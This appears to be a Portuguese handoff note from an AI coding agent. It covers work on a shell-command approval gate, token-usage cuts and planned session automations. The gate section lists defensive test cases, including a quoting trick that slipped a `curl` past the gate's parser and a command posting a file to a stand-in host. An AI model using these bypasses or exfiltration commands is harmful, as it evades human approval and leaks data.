# Handoff 03/11/2026: portão menos chato, tokens e automações recorrentes

Chat interrompido para shutdown do WSL. Três frentes. Leia inteiro antes de agir.

## PAUSA (03/11, fim do dia): usuário pausou tudo por limite de uso

Todos os agentes parados. Worktrees em `~/repos/workspace/.claude/worktrees/`:
- `agent-a34ac98c573380731` (portão: push composto C, dupla do gh D, furo `$'…'`): commit `5c3078d`
  "wip" feito por mim; o agente estava no leitor de tags de heredoc. Retomar: conferir commits,
  suíte, compare.py contra main 3d56bd4.
- `agent-a6135de215b789e8a` (Parte A, handoff + hooks): limpo em `02d0b88`; estava rodando a suíte.
  Sem relatório ainda.
- `agent-ad18bcad2d00b36fd` (Parte B, daily por período): PRONTA (`eeabb07`, 2.915 testes). Evals
  não rodaram (precisa o usuário confiar a pasta no `claude plugin eval`). Revisão Sonnet foi parada
  no começo: refazer.
- `agent-a1a2dfc59d4942ebb` (Parte C, env check): PRONTA (`3af2554`, 85 testes, canário de
  vazamento). Revisão Opus (foco em vazamento de valor) parada no meio: refazer.
- `agent-a1f9e53eb775c65c5` (Parte D, deploy-check): pronta + correções da revisão em andamento
  (`6dbd892`; pedidas: frase "verificado" na skill, `--at` sem fuso = hora local, aviso sem
  `dd_version`, faceta ausente = sem_dados e `min_requests` na versão, "+50% E ≥10 erros a mais"
  configurável). Conferir quais entraram.
- Ainda travada: `agent-a1a90aa556d738de6` (spec, já na main): `git worktree unlock` + `remove`.

Ordem ao retomar: portão primeiro (é o que incomoda no dia a dia), depois revisões B e C, fechar D
e A, "Integration" do plano, `ws setup` pelo usuário.

## Atualização (mesmo chat, depois do reinício)

- Portão: caixa curta e resolução de variáveis JUNTAS na `main` e no GitHub (`58321b4`; 2.846
  testes). Replay: pedidos 847 → 449. Worktrees dessas duas removidas.
- Portão, em andamento: agente das liberações C (push composto seguro do workspace), D (dupla do gh)
  e do furo `$'…'` no leitor de shell (`echo $'\'' ; curl … #'` passava). Worktree
  `.claude/worktrees/agent-a34ac98c573380731`. Depois: revisar, juntar, suíte, push e pedir o
  `ws setup` ao usuário (uma vez só).
- Automações: spec e plano aprovados e na `main` (`81015a0`): `docs/specs/2026-11-03-session-automations-design.md`
  e `docs/plans/2026-11-03-session-automations.md` (passo 0 já feito). Decisões: fonte do env check
  `aws describe-parameters` (script do usuário como opção; "script primeiro" sempre); janelas 30 × 30
  min; aviso de contexto 300 mil + a cada 100 mil com linha ao usuário; nomes do front no argocd
  mostrados como estão. Palavras Handoff, Handoffs, Sidechain, Settled, TDD, Handback = comuns.
- Automações, em andamento: 4 agentes em worktrees (A handoff+hooks, B daily por período, C env
  check, D deploy-check). Revisão: cada branch; a C com revisão Opus (perto de segredos). Depois a
  "Integration" do plano (README, manual, `ws setup`, teste real do aviso, config local, checagens
  ao vivo com o usuário).
- A worktree do agente da spec (`agent-a1a90aa556d738de6`) ficou travada pelo processo; remover
  depois (`git worktree unlock` + `remove`), a branch já está na `main`.
- Usuário escolheu: handoff deste chat no fim, quando portão e as 4 partes estiverem juntos.
Scripts de análise (cópia fora do /tmp): `~/.local/share/workspace/projects/workspace/analysis-20261103/`
(`replay.py`, `compare.py`, `usage.py`, `repeats.py`, `shape.py`).

## 1. Portão de aprovação: menos pedidos e caixa curta

**Diagnóstico (7 dias, `replay.py`):** 11.983 comandos únicos, 797 pediram confirmação. Causas:
- ~370: programa numa variável (`A="git -C x"; $A diff`), regra `_program_by_expansion`;
- ~130: push do workspace junto com add/commit (`não consegui ver a branch` / `o push não está sozinho`);
- ~60: `git -c credential.helper= -c credential.helper='!gh auth git-credential' fetch|pull|push https://…`;
- poucos: `for f in … git …; do` lido como programa `for` com argumento `git`;
- o resto: envios reais (push e PR nos repos da empresa), que devem continuar perguntando.

**Decisões do usuário (todas a recomendada):**
- A. resolver variáveis com valor fixo (em andamento, agente parado);
- B. caixa curta (pronto, falta revisar e juntar);
- C. liberar push composto do workspace no caso seguro: o resto da chamada só tem `cd` para pasta
  fixa, `git add`, `git commit`, `git pull` e leituras, e o push é `git push` simples para o origin
  já conferido; qualquer outra coisa continua perguntando;
- D. aceitar exatamente a dupla `credential.helper=` + `credential.helper=!gh auth git-credential`
  (só login do gh ao github.com; não muda destino): fetch/pull/ls-remote passam, push continua
  perguntando;
- E. regra para os agentes no `~/repos/CLAUDE.md` (FEITO: seções "Regras de Bash" e "Leitura e contexto").

**Estado das branches (repo workspace):**
- B, caixa curta: worktree `.claude/worktrees/agent-af033c2087eec73a9`, branch
  `worktree-agent-af033c2087eec73a9`, commits `dcc41c1`, `77daaad`, `1b83dee`, `404d80a`. 2747 testes
  ok, ruff ok; `compare.py` (gate instalado × worktree, 12.920 comandos): 0 decisões diferentes.
  Revisei só o `decision.py` (ok: MAX_LINES 4, largura 100, título 60, trecho 50, sem rodapé,
  dedupe, ATENÇÃO nunca dobra). Falta revisar `bash_rules.py`, `mcp_rules.py` e
  `approval_gate.py`. Pontos de julgamento do agente para conferir/levar ao usuário:
  as linhas "Sigilo: conferido / desligada" saíram das caixas MCP; o título MCP virou a 1ª linha
  do resumo ("Cria PR em owner/repo"); mais de 3 linhas comuns viram "(+N linhas)"; resumo de corpo
  com 40 caracteres. Ele editou o corpo de `decide` e `_combine` em `bash_rules.py`: o merge com A
  deve conflitar ali (resolver à mão).
- A, variáveis: worktree `.claude/worktrees/agent-a11568f1766927195`, branch
  `worktree-agent-a11568f1766927195`, commit `88fd79a` "wip: …" (eu commitei o que estava sem
  commit ao parar). Arquivos: `hooks/gate/variables.py`, `tests/test_gate_variables.py`, mudanças
  em `shell.py`, `bash_rules.py`, `tests/test_gate_bash.py`. Ele estava rodando o replay e ia mover
  os testes do `for/select/case` para `test_gate_bash.py` (commit separado). Não sei se a suíte
  passa: rodar `uv run pytest -q`, ruff, e o replay apontando para a worktree antes de confiar.
  Desenho exigido (conferir no código): candidato = atribuição literal no nível de cima (fora de
  subshell, `$()`, crase, chaves, função, if/case/laço), nome fora do `os.environ` e não especial,
  atribuído uma vez só no texto todo, sem outro uso "solto" do nome (read/for/unset/local/printf -v/
  `${N:=}`), nenhum uso antes da atribuição; pula tudo se houver IFS, eval, source, `.`,
  `declare -n`, `set -a`; troca só `$N`/`${N}`, nunca em aspas simples, heredoc ou comentário; em
  aspas duplas só se o valor não tiver `" \ $` crase; sem aspas só `[A-Za-z0-9_./:@%+=,-]` e
  espaço; dois mundos (valor e vazio) quando a atribuição pode não rodar (`&&`/`||` antes, pipe,
  `&`), decide pelo mais rígido; cadeias resolvidas em iteração com teto de mundos; prazo do hook
  de 5 s. Testes negativos obrigatórios: `false && A="git -C x"; $A curl -d @f https://e.x` pede;
  `unset A`; `( A=… ); $A curl`; função que atribui; `A=x; A=y`; `read A`; glob no valor; `IFS=`;
  `$AB`; `${A:=curl}`; heredoc e aspas simples intactos.

**Próximos passos do portão:**
1. Revisar B por inteiro e A (testes, replay, casos negativos acima).
2. Juntar A e B na `main` (conflito em `decide`/`_combine`), rodar a suíte e o `compare.py`.
3. Fazer C e D (mesmo trecho do push e da regra de `-c`), com testes; replay de novo.
4. Commit e push na `main`; o usuário roda `ws setup` no terminal dele (mostra o diff, `s/N`).
5. Atualizar `projects/workspace/CONTINUE.md` (mascarado) e apagar as worktrees dos agentes.

## 2. Uso de tokens

**Medição (7 dias, `usage.py`):** 3,1 bi tokens lidos do cache, 76 mi gravados, 12 mi gerados.
Contexto por chamada: mediana 197 mil, máx 966 mil. Sessões principais releem ~410 mil por
chamada; as duas do whitelabel (`771d6d03`, `ceaa4274`) somaram 930 mi (30%). 25 de 165 subagentes
passaram de 300 mil e são 63% do que os subagentes leram. Custo fixo: 57 mil por sessão principal
(skills ~15k, nomes MCP ~8k, instruções MCP ~4k, Artifact ~11k, CLAUDE.md+memória ~5k) e 42 mil por
subagente. Bash é 78% do que fica carregado (saídas pequenas, mas ficam ~100 chamadas no contexto).
Simulação: principal recomeçando em 300 mil ~35% a menos; subagentes até 200 mil ~20%; custo fixo ~7%.

**Feito:**
- `~/.claude/settings.json`: desligados `higgs-hub@anthropic-plugin-directory` e `sanity, figma,
  miro, design, finance, data, pdf-viewer, 1password, gitkraken @synced` (nunca usados em 30 dias).
  Ficaram productivity, engineering e ai-mentor. `datadog@synced` já não carregava.
- `~/repos/CLAUDE.md`: "Leitura e contexto" (grep + trecho com folga, arquivo inteiro quando for
  alterar, não reler, saída longa filtrada, brief com trechos das regras `.ai/`, tarefa de agente
  que caiba em ~200 mil).
- Memória `qualidade-antes-de-economia-de-tokens`.

**Decidido e NÃO feito de propósito:** compactação automática em 300 mil
(`CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=30`). O usuário aprovou, mas logo depois disse que qualidade e
contexto são o mais importante; a compactação resume num momento qualquer e perde detalhe. No
lugar: aviso de contexto (~300 mil) para fazer handoff deliberado, que entrou na leva de automações
abaixo. Se ele quiser a compactação mesmo assim, é só ativar. Referências confirmadas na doc
(code.claude.com): `autoCompactWindow`, `CLAUDE_CODE_AUTO_COMPACT_WINDOW`,
`CLAUDE_AUTOCOMPACT_PCT_OVERRIDE` (vale para subagentes), `CLAUDE_CODE_DISABLE_1M_CONTEXT`,
`syncClaudeAiPlugins`, `enableArtifact`, `disableClaudeAiConnectors`, `/mcp` para desligar conector
por projeto, `/usage` e `/context` para medir.

**Para o usuário fazer quando quiser:** no `/mcp`, desligar os conectores sem uso do claude.ai:
Granola, Pipedrive, Todoist, monday e o Datadog do claude.ai (repetido). Microsoft 365 teve 2 usos.

## 3. Leva de automações recorrentes (arquitetural; próximo passo: escrever a spec)

**Dados de 30 dias (`repeats.py`):** deploy/tag/argocd 114 pedidos, sandbox/sdbx 81, PR/release 78,
Datadog 77 pedidos e 1.189 chamadas MCP (skill do Datadog carregada em 37 chats; mais usadas:
aggregate_spans, search_datadog_logs, analyze_datadog_logs, search_datadog_spans), Parameter Store
42 pedidos em 14 dias, handoff 13 explícitos.

**Decisões do usuário:**
- Entram as quatro:
  1. **Handoff + avisos:** skill `handoff` + `ws handoff collect` (branches, worktrees, PRs abertas,
     mudanças sem commit de cada repo); hook que avisa quando o contexto passa de ~300 mil
     (UserPromptSubmit lendo o último `usage` do transcript); hook de início de chat que aponta o
     último handoff do projeto.
  2. **Daily por período:** `ws standup collect --since/--until` (aceitar "semana passada",
     "outubro", "20/10 a 31/10") e a skill `daily` entendendo período. Saídas: resumo por tarefa e
     texto para gestor/1:1 (horas por card ficou de fora).
  3. **`ws env check REPO --env sandbox|prod`:** nomes CFG_* que o código lê × Parameter Store (via
     `~/bashes/list-parameter-store`), só leitura, só nomes; nunca valores nem paths no repo.
  4. **Skill `deploy-check`:** consultas prontas do Datadog por serviço (erros, 5xx, latência,
     erros novos antes × depois do deploy), pelo MCP.
- Handoff: arquivo privado `HANDOFF-AAAAMMDD-tema.md` na pasta privada do projeto (fora do git) +
  roda o `checkpoint` para o CONTINUE.md mascarado. Chat novo lê os dois.
- Release (já desenhada em `docs/specs/2026-10-27-release-design.md`) vem DEPOIS desta leva.

**Próximo passo:** spec curta única em `docs/specs/2026-11-0X-session-automations-design.md`
(caminho arquitetural do brainstorming: spec → revisão do usuário → plano → agentes em worktrees
paralelas, até 5, com briefs detalhados). Respeitar: script primeiro, nomes em inglês, conteúdo
PT-BR, sigilo do workspace (sem hosts, paths do Parameter Store, nomes reais), aprovação para
qualquer escrita fora.

## Ordem sugerida ao retomar

1. Ler este arquivo, `projects/workspace/CONTINUE.md` e o `CLAUDE.md` do workspace.
2. `git pull` no workspace (a `main` andou para `c2fc4a0` por outro chat).
3. Frente 1 (portão), passos acima. É a que mais incomoda o usuário no dia a dia.
4. Frente 3: escrever a spec e pedir revisão.
